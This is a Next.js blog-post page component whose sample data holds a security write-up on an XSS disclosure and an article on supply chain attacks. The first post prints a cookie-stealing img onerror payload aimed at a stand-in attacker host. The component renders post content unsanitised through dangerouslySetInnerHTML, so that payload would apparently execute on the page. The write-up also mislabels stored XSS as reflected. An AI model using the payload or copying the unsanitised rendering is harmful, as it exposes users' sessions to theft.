'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { Calendar, User, Clock, ArrowLeft, Share2, Bookmark, ThumbsUp } from 'lucide-react';
import { useParams } from 'next/navigation';

// Sample blog posts data - this would be replaced with your actual data fetching logic
const blogPosts = [
  {
    id: "1",
    title: "Uncovering a Critical XSS Vulnerability in Popular E-commerce Platform",
    content: `
# Uncovering a Critical XSS Vulnerability in Popular E-commerce Platform

In the world of cybersecurity, cross-site scripting (XSS) vulnerabilities remain one of the most common and dangerous security flaws in web applications. Today, I'm sharing the details of how I discovered, analyzed, and responsibly disclosed a critical XSS vulnerability in a widely-used e-commerce platform that could have affected millions of users worldwide.

## Initial Discovery

The vulnerability was first identified during a routine security assessment of a client's e-commerce site. While testing the product review functionality, I noticed that the platform wasn't properly sanitizing user input in certain fields. By submitting a specially crafted review that contained JavaScript code, I was able to make the script execute whenever anyone viewed the product page.

\`\`\`javascript
// The malicious payload looked something like this
<img src=x onerror="fetch('https://attacker-server.com/steal?cookie='+document.cookie)">
\`\`\`

This is a classic reflected XSS attack vector, but what made this particularly concerning was that:

1. The vulnerability existed in the core platform code, not just my client's implementation
2. The injected scripts would execute with the privileges of whoever viewed the page
3. The attack could be easily automated and scaled

## Impact Assessment

The potential impact of this vulnerability was severe:

- **Session hijacking**: Attackers could steal user session cookies, allowing them to impersonate legitimate users
- **Credential theft**: Malicious scripts could create fake login forms to harvest credentials
- **Financial damage**: In an e-commerce context, this could lead to payment fraud
- **Data exfiltration**: Personal information displayed on the page could be silently sent to attacker-controlled servers

With over 50,000 active online stores using this platform, the potential reach of this vulnerability was massive.

## Responsible Disclosure Process

After confirming the vulnerability, I immediately initiated the responsible disclosure process:

1. Documented the vulnerability with clear reproduction steps
2. Created a proof-of-concept that demonstrated the issue without causing harm
3. Identified the relevant security contact at the platform vendor
4. Submitted a detailed vulnerability report through their secure channel
5. Agreed to their proposed 60-day timeline for developing and deploying a fix

## Vendor Response

To their credit, the vendor responded quickly and professionally:

- Initial acknowledgment came within 12 hours
- Technical team confirmed the vulnerability within 48 hours
- CVE number was assigned: CVE-2024-XXXXX 
- A fix was developed and tested within three weeks
- A security patch was released to all platform users before public disclosure

## Technical Breakdown of the Fix

The vendor's fix implemented several defensive measures:

1. **Input sanitization**: Implemented a comprehensive HTML sanitization library to clean user-submitted content
2. **Content Security Policy (CSP)**: Added strict CSP headers to prevent script execution even if sanitization was bypassed
3. **Output encoding**: Applied context-specific encoding when rendering user content

These overlapping protective measures provided defense-in-depth against similar vulnerabilities.

## Lessons Learned

This case highlights several important security principles:

- **Never trust user input**: All user-submitted data must be properly validated and sanitized before use
- **Defense in depth**: Multiple security controls provide better protection than relying on a single measure
- **Responsible disclosure works**: Collaborative efforts between researchers and vendors benefit everyone in the ecosystem

## Conclusion

This experience reinforces why I'm passionate about cybersecurity work. By identifying and helping fix this vulnerability before it could be widely exploited, we potentially protected millions of online shoppers from fraud and identity theft.

For developers building web applications, this serves as a reminder to implement robust input validation, leverage modern security headers like CSP, and regularly conduct security testing to identify similar issues before they make it to production.
    `,
    date: "March 28, 2025",
    author: "Zephryx",
    readTime: "8 min read",
    tags: ["Web Security", "XSS", "Bug Bounty"],
    relatedPosts: ["2", "3"]
  },
  {
    id: "2",
    title: "The Rising Threat of Supply Chain Attacks: What Organizations Need to Know",
    content: `
# The Rising Threat of Supply Chain Attacks: What Organizations Need to Know

Supply chain attacks have emerged as one of the most sophisticated and devastating cybersecurity threats facing organizations today. Unlike direct attacks, supply chain compromises target the less-secure elements in your trusted network of suppliers, vendors, and service providers to gain access to your systems.

## What Makes Supply Chain Attacks So Dangerous?

These attacks are particularly effective because they exploit the implicit trust organizations place in their suppliers and the software or hardware they provide. When a trusted vendor unwittingly distributes malicious code, it bypasses many traditional security controls because the threat comes through legitimate channels.

Some key characteristics that make these attacks especially dangerous:

- **Trust exploitation**: They leverage established trust relationships between organizations and vendors
- **Widespread impact**: A single compromise can affect thousands of downstream customers
- **Difficult detection**: The malicious code often bears legitimate digital signatures
- **Persistent access**: Attackers can maintain long-term access through trusted update channels

## Notable Supply Chain Attacks

### The SolarWinds Breach

Perhaps the most infamous supply chain attack was the 2020 SolarWinds incident. Attackers compromised the build system for the Orion network management software, inserting a backdoor into updates that were then distributed to approximately 18,000 customers, including multiple US government agencies and Fortune 500 companies.

### The Kaseya Attack

In 2021, ransomware attackers exploited vulnerabilities in Kaseya's VSA software, which is used by many managed service providers (MSPs). Through this single entry point, the attackers were able to encrypt systems belonging to approximately 1,500 businesses.

## Key Mitigation Strategies

Protecting against supply chain attacks requires a comprehensive approach:

### 1. Vendor Security Assessment

Implement a robust vendor security assessment program:
- Require vendors to complete detailed security questionnaires
- Review their security practices, including SDLC security measures
- Include security requirements in contracts and SLAs
- Perform periodic reassessments

### 2. Software Supply Chain Security

- Implement software composition analysis (SCA) to identify and verify components
- Use software bills of materials (SBOMs) to maintain visibility into dependencies
- Verify signatures and checksums before installing updates
- Consider implementing a package proxy to cache and vet updates

### 3. Zero-Trust Architecture

- Apply the principle of least privilege across your environment
- Segment networks to limit lateral movement opportunities
- Implement strong authentication for all access points
- Monitor and verify all activities, even from trusted sources

### 4. Monitoring and Detection

- Deploy behavioral analytics to identify unusual system activities
- Monitor network traffic for anomalous communications
- Implement integrity checking for critical system files
- Conduct regular threat hunting activities

## The Future of Supply Chain Security

As organizations improve their direct defenses, attackers will increasingly target supply chain vulnerabilities. The future of supply chain security will likely include:

- **Enhanced transparency requirements**: More regulations requiring software transparency
- **Automated verification systems**: Real-time validation of software integrity
- **Collaborative defense**: Industry-wide sharing of supply chain threat intelligence
- **DevSecOps evolution**: Security becoming even more integrated into development processes

## Conclusion

Supply chain security represents one of the most challenging aspects of modern cybersecurity. Organizations must recognize that their security posture is only as strong as the weakest link in their supply chain.

By implementing comprehensive vendor assessment programs, adopting zero-trust principles, and maintaining vigilant monitoring, organizations can significantly reduce their exposure to these sophisticated attacks.

Remember: Your security perimeter now extends far beyond your organization's boundaries – it includes every supplier, vendor, and service provider in your ecosystem.
    `,
    date: "March 15, 2025",
    author: "Zephryx",
    readTime: "6 min read",
    tags: ["Supply Chain", "Risk Management", "Cybersecurity"],
    relatedPosts: ["1", "5"]
  },
  {
    id: "3",
    title: "Breaking Down the OWASP Top 10 (2024 Edition)",
    content: "Full article content here...",
    date: "February 22, 2025",
    author: "Zephryx",
    readTime: "12 min read",
    tags: ["OWASP", "Web Security", "Best Practices"],
    relatedPosts: ["1", "4"]
  },
  {
    id: "4",
    title: "Securing APIs in the Age of Microservices",
    content: "Full article content here...",
    date: "February 8, 2025",
    author: "Zephryx",
    readTime: "7 min read",
    tags: ["API Security", "Microservices", "OAuth"],
    relatedPosts: ["3", "5"]
  },
  {
    id: "5",
    title: "Threat Hunting: Beyond Traditional Security Monitoring",
    content: "Full article content here...",
    date: "January 17, 2025",
    author: "Zephryx",
    readTime: "9 min read",
    tags: ["Threat Hunting", "SOC", "Security Monitoring"],
    relatedPosts: ["2", "4"]
  }
];

export default function BlogPost() {
  const params = useParams();
  const postId = params.id;

  const [post, setPost] = useState(null);
  const [relatedPosts, setRelatedPosts] = useState([]);
  const [isBookmarked, setIsBookmarked] = useState(false);
  const [isLiked, setIsLiked] = useState(false);
  const [showTooltip, setShowTooltip] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // In a real application, you would fetch the post data from an API
    // Simulate API call with setTimeout
    setTimeout(() => {
      // Find the post that matches the ID from URL params
      const foundPost = blogPosts.find(post => post.id === postId);
      setPost(foundPost);

      if (foundPost && foundPost.relatedPosts) {
        const related = blogPosts.filter(p => foundPost.relatedPosts.includes(p.id));
        setRelatedPosts(related);
      }
      
      setIsLoading(false);
    }, 500); // Small timeout to simulate loading
  }, [postId]);

  const handleCopyLink = () => {
    navigator.clipboard.writeText(window.location.href);
    setShowTooltip(true);
    setTimeout(() => {
      setShowTooltip(false);
    }, 2000);
  };

  const renderContent = (content) => {
    // This is a simple markdown renderer for our sample content
    // In a real application, you would use a proper markdown library
    const formattedContent = content
      .replace(/^# (.*$)/gm, '<h1 class="text-3xl font-bold text-white mt-8 mb-4">$1</h1>')
      .replace(/^## (.*$)/gm, '<h2 class="text-2xl font-bold text-white mt-6 mb-3">$1</h2>')
      .replace(/^### (.*$)/gm, '<h3 class="text-xl font-bold text-white mt-5 mb-2">$1</h3>')
      .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
      .replace(/\- (.*$)/gm, '<li class="ml-4">$1</li>')
      .replace(/\n\n/g, '<br /><br />');
    
    return <div dangerouslySetInnerHTML={{ __html: formattedContent }} />;
  };

  if (isLoading) {
    return (
      <main className="min-h-screen bg-black text-green-500 flex justify-center items-center">
        <div className="animate-pulse">Loading blog post...</div>
      </main>
    );
  }

  if (!post) {
    return (
      <main className="min-h-screen bg-black text-green-500">
        <div className="container mx-auto px-4 py-16">
          <div className="text-center">
            <h1 className="text-3xl font-bold text-white mb-4">Blog Post Not Found</h1>
            <p className="mb-6">Sorry, the article you're looking for doesn't exist or has been removed.</p>
            <Link href="/blog" className="text-green-500 hover:text-green-400 flex items-center justify-center">
              <ArrowLeft className="mr-2" size={20} />
              Back to Blog
            </Link>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-black text-gray-300">
      <div className="container mx-auto px-4 py-16">
        {/* Blog Post Header */}
        <div className="mb-12">
          <Link href="/blog" className="text-green-500 hover:text-green-400 flex items-center mb-8">
            <ArrowLeft className="mr-2" size={20} />
            Back to Blog
          </Link>
          
          <h1 className="text-4xl md:text-5xl font-bold text-white mb-6">{post.title}</h1>
          
          <div className="flex flex-wrap items-center text-sm text-gray-500 mb-6 gap-4">
            <div className="flex items-center">
              <Calendar size={16} className="mr-1 text-green-600" />
              {post.date}
            </div>
            <div className="flex items-center">
              <User size={16} className="mr-1 text-green-600" />
              {post.author}
            </div>
            <div className="flex items-center">
              <Clock size={16} className="mr-1 text-green-600" />
              {post.readTime}
            </div>
          </div>
          
          <div className="flex flex-wrap gap-2 mb-6">
            {post.tags.map((tag, index) => (
              <span key={index} className="bg-green-900 text-green-400 text-xs px-3 py-1 rounded-full">
                {tag}
              </span>
            ))}
          </div>
          
          <div className="flex space-x-4 border-t border-green-900 pt-6">
            <button 
              onClick={handleCopyLink}
              className="flex items-center text-gray-400 hover:text-green-500 transition-colors"
              aria-label="Share this article"
            >
              <Share2 size={18} className="mr-2" />
              Share
              {showTooltip && (
                <span className="ml-2 text-xs bg-green-900 text-green-300 px-2 py-1 rounded">
                  Link copied!
                </span>
              )}
            </button>
            
            <button 
              onClick={() => setIsBookmarked(!isBookmarked)}
              className={`flex items-center transition-colors ${isBookmarked ? 'text-green-500' : 'text-gray-400 hover:text-green-500'}`}
              aria-label={isBookmarked ? "Remove bookmark" : "Bookmark this article"}
            >
              <Bookmark size={18} className="mr-2" fill={isBookmarked ? "currentColor" : "none"} />
              {isBookmarked ? "Bookmarked" : "Bookmark"}
            </button>
            
            <button 
              onClick={() => setIsLiked(!isLiked)}
              className={`flex items-center transition-colors ${isLiked ? 'text-green-500' : 'text-gray-400 hover:text-green-500'}`}
              aria-label={isLiked ? "Unlike" : "Like this article"}
            >
              <ThumbsUp size={18} className="mr-2" fill={isLiked ? "currentColor" : "none"} />
              {isLiked ? "Liked" : "Like"}
            </button>
          </div>
        </div>
        
        {/* Blog Post Content */}
        <div className="prose prose-lg prose-invert prose-green max-w-none mb-12">
          {renderContent(post.content)}
        </div>
        
        {/* Related Articles */}
        {relatedPosts.length > 0 && (
          <div className="border-t border-green-900 pt-12 mt-12">
            <h2 className="text-2xl font-bold text-white mb-6">Related Articles</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {relatedPosts.map(relatedPost => (
                <Link 
                  key={relatedPost.id} 
                  href={`/blog/${relatedPost.id}`} 
                  className="border border-green-800 rounded-lg p-6 hover:bg-green-900/20 transition duration-300"
                >
                  <h3 className="text-xl font-bold mb-3 text-white">{relatedPost.title}</h3>
                  <div className="flex flex-wrap items-center text-sm text-gray-500 mb-4 gap-4">
                    <div className="flex items-center">
                      <Calendar size={16} className="mr-1 text-green-600" />
                      {relatedPost.date}
                    </div>
                    <div className="flex items-center">
                      <Clock size={16} className="mr-1 text-green-600" />
                      {relatedPost.readTime}
                    </div>
                  </div>
                </Link>
              ))}
            </div>
          </div>
        )}
      </div>
    </main>
  );
} 